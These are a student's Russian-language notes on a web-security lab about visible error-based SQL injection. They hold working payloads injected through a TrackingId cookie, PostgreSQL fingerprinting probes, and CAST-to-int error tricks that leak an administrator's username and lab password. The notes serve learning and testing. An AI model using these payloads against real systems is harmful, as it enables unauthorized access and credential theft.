# Blind SQL injection vulnerabilities
# *СЛЕПЫЕ SQLi  (3/7 лаба в этой теме)


# ТИП # Visible error-based SQL injection
// КОГДА ВИДИМ ОШИБКУ (ВЫВОДИТСЯ ОШИБКА)
// МОЖНО СПРОВОЦИРОВАТЬ ОШИБКУ КОТОРАЯ ВЫВЕДЕТ ДАННЫЕ

==КРАТКО СМЫСЛ:==

```sql
CAST('123' AS int)   → 123 (число)
CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) эту ошибку можно прочитать если она выводится! так еще и эта ошибка может выглядеть так: 
при: CAST((SELECT 'password') AS int)
//ответ: "123@password2025" невозможно перобразовать в int -> то есть покажет сам пароль!
``` 


### Извлечение конфиденциальных данных с помощью подробных сообщений об ошибках SQL

это когда бд возвращает в ошибке полезную инфу которую я могу использовать и влиять на инфу которая вовращается в ошибке

например в ошибке может быть выдан полный запрос к бд который вызвал ошибку при подстановки одной кавычки '

несмотря на то что слепая sqli не возвращает данных - мы можем вывести ошибку и слепая i превращиется  в видимую

==лаба # видимая SQL-инъекция на основе ошибок==

исходыне данные таблица `users`, with columns called `username` and `password`  и `administrator` нужно украсть пароль и войти в аккаунт!


план:
1) найти место иньекции
2) подтвердить наличие уязвимости
3) слепыми запросами узнать тип бд
4) узнать наличие таблицы users
5) узнать наличие коллон `username` and `password` в  таблицe users
6) узнать есть ли пользователь  ==administrator==
7) достать побуквенно пароль
8) выполнить вход в учетку 

ход лабы:
1) ищу место - поставил кавычку одну - ошибка страниц
2) поставил две кавычки - ошибка ушла - подтвердил
3) вместе с ошибкой появилась ошибка ои бд
```html
                   <p class=is-warning>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'nMUDX6uNhn7G8R3i''. Expected  char</p>
```

4)   проверка бд 



|Oracle|`SELECT banner FROM v$version   SELECT version FROM v$instance 
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

'||(SELECT '' FROM dual)||'--      - ошбка - не оракл
' OR (SELECT '')=''--                      - работает значит MYSQl
' AND CONCAT('a','b')='ab'--     - работает значит MySQL
'||(SELECT '' WHERE ...)||'--        - ошибка - не постеджер
'||(SELECT '')||'--                             - работает - хз че это тогда 
' AND 'a'||'b'='ab'--                          -тоже работает

проверка версии 
' AND @@version LIKE '%'--     -- MySQL   не сработало - значит не MySQL
' AND version() LIKE '%'--          -- PostgreSQL     не сработало

' AND @@version IS NOT NULL--     проверка на MySQL;  ответ с ошибкой  ERROR: column "version" does not exist
  Position: 60

' AND version() IS NOT NULL--          - нет ошибок   , проверка на PostgreSQL
' AND 'a'||'b'='ab'--                                   - нет ошибок  , проверка на PostgreSQL

' AND CONCAT('a','b')='ab'--               - нет ошибок  , проверка на MySQL

' AND current_database() IS NOT NULL--        - нет ошибок   , =PostgreSQL

' AND (SELECT COUNT( * ) FROM pg_tables)>0--    - нет ошибок  = PostgreSQL        

вывод - это PostgreSQL!


еще раз проверил на тип бд
-- PostgreSQL: есть функция version() 
' AND version() IS NOT NULL--                                    рабоатет  это PostgreSQL!

-- SQLite: нет version(), но есть sqlite_version()
' AND sqlite_version() IS NOT NULL--                          нет 

-- PostgreSQL: системные таблицы pg_*
' AND (SELECT COUNT( * ) FROM pg_tables)>0--       рабоатет это PostgreSQL!

-- SQLite: системная таблица sqlite_master
' AND (SELECT COUNT( * ) FROM sqlite_master)>0--            нет



5)  узнать наличие таблицы users

' AND EXISTS(SELECT 1 FROM users)--          без ошибок - 
' AND EXISTS(SELECT 1 FROM FC0Fusers)--    с ошгибкой

значит таблица  users есть! 

' AND (SELECT 'a' FROM users WHERE username= 'administrator')='a'--   не работает  
' AND (SELECT 'a' FROM users WHERE username= 'administrator')='a'   не работает  
' AND (SELECT 'a' FROM users WHERE username= 'administrator')='a--   не работает  
' AND (SELECT 'a' FROM users WHERE username= 'administrator')='a   не работает  
' AND (SELECT 'a' FROM users WHERE username= 'administrator')=a   не работает  
ничего сука не работает!!!!

и ошибка 
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'nMUDX6uNhn7G8R3i' AND (SELECT 'a' FROM users WHERE username='. Expected  char
*запрос обрезался по длинне! максимум 95 символов*

Незавершенный строковый литерал, начинающийся с позиции 95 в SQL SELECT * ИЗ tracking, ГДЕ id = 'nMUDX6uNhn7G8R3i' И (ВЫБЕРИТЕ 'a' ИЗ users, ГДЕ username='. Ожидаемый символ

короче говоря - ошибка говрит что с кавычками проблема!
*запрос обрезался по длинне! максимум 95 символов*


' AND (SELECT 'a' FROM users LIMIT 1)='a'--       работает
*значит таблица юзерс существует!*

' AND (SELECT password FROM users LIMIT 1) IS NOT NULL-- рабоатет
*значит существует первая строчка и колнка колонка паролей в таблице этой и ее значение не равно null*

==проблема в том что запрос обрезался на 95 символов==


Cookie: TrackingId=jR6LbgZmpVcskt1a' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--   ==не работает!!!==

*оказывается можно убрать TrackingId  чтобы освободить место*

Cookie: TrackingId=j' AND (SELECT LENGTH(password) FROM users WHERE user='admin')=1--       ==работает!!!!==
*просто обрезал jR6LbgZmpVcskt1a  на j *

```sql
CAST(value AS type) // функция Преобразует значение в указанный тип.
```

- Если `CAST` успешен → запрос выполняется (200 OK)
    
- Если `CAST` падает (не int) → ошибка в ответе (500 Error)

# CAST ()
```sql
CAST('123' AS int)   → 123 (число)
CAST('text' AS int)  → ОШИБКА (нельзя преобразовать) эту ошибку можно прочитать если она выводится!
```
*так как пароль - это строковый тип почти всегда - тогда можно попытать преобразовать его в int - что вызовет ошибку и если ошибка выводится то мы увидим результат!*
*САМА ОШИБКА МОЖЕТ ВЕРНУТЬ ТО ЗНАЧЕНИЕ КОТОРОЕ МЫ ПЫТАЕМСЯ ПЕРЕВЕСТИ В ИНТ
и если сделать CAST((SELECT 'password') AS int) то ошибка высветит сам пароль и скажет что его нельзя в инт перевести!*


   # Зачем нужно CAST в SQL-инъекциях? :

1. **Вызвать ошибку** с нужными данными в тексте ошибки
    
2. **Узнать тип данных** столбца
    
3. **Обойти фильтры** WAF

- `' AND 1=CAST((SELECT 'password') AS int)--` → Ошибка (текст 'a' *нельзя в int) вызовет ошибку которая может выстветить сам пароль и что его невожможно перевести в инт*
    
- `' AND 1=CAST((SELECT '1') AS int)--` → Успех (можно конвертировать)


короче говоря  можно было убрать вот это jR6LbgZmpVcskt1a обрезав ее!

и тогда запросы проходят!



Cookie: TrackingId=j' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--      // ==этот запрос вернул мне ошибку с первым юзером в таблице== ERROR: invalid input syntax for type integer: "administrator" 


Cookie: TrackingId=j' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--    //==этот запрос вернул пароль==
ERROR: invalid input syntax for type integer: "9ny8el74nqexhfvksk8h"



